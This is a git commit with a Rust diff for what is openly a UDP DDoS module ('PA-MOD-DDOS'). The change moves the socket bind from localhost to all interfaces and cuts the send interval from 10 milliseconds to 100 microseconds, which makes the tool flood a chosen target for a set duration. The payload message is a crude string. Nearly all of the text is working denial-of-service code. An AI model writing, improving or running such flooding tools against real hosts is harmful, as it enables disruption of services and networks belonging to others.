0a042c03d3222698927cc4ed28415a91e1dc4b35
lululufr <lucas.lm.miller@gmail.com>
2024-06-12 16:07:58 +0200

    FIX udp ddos

--- PA-MOD-DDOS/src/main.rs
+++ PA-MOD-DDOS/src/main.rs
@@ -9,14 +9,15 @@ use tokio::time::{sleep, Duration};
 
 async fn send_udp_message(server_addr: &str) -> Result<(), Box<dyn Error>> {
     // Crée un socket UDP asynchrone
-    let socket = UdpSocket::bind("127.0.0.1:0")?;
+
+    let socket = UdpSocket::bind("0.0.0.0:0")?;
 
     // Message à envoyer
     let msg = b"8==========>";
 
-    // Envoie le message au serveur de manière asynchrone
-    socket.send_to(msg, server_addr)?;
-    println!("Message envoyé à {}", server_addr);
+    socket.send_to(msg, server_addr).expect("TODO: panic message");
+    //socket.send_to(msg, server_addr)?;
+    //println!("Message envoyé à {}", server_addr);
 
     Ok(())
 }
@@ -40,11 +41,10 @@ async fn ddos_udp(rx: &mut mpsc::Receiver<()>, target_clone: String) {
 
     loop {
         tokio::select! {
-            _ = sleep(Duration::from_millis(10)) => {
+            _ = sleep(Duration::from_nanos(100000)) => {
                 println!("cmp = {}", cmp);
                 send_udp_message(&target_clone).await.expect("Erreur lors de l'envoi du message UDP");
                 cmp += 1;
-                println!("Message périodique");
             }
             _ = rx.recv() => {
                 // Arrêter d'afficher des messages lorsque le signal est reçu
@@ -76,14 +76,14 @@ async fn main() {
         chrono(tx,ddos_time).await;
     });
 
-    let print_task = tokio::spawn(async move {
+
+    let ddos_task = tokio::spawn(async move {
         ddos_udp(&mut rx, target).await;
     });
 
 
-
     chrono_task.await.unwrap();
-    print_task.await.unwrap();
+    ddos_task.await.unwrap();
 }
 
 
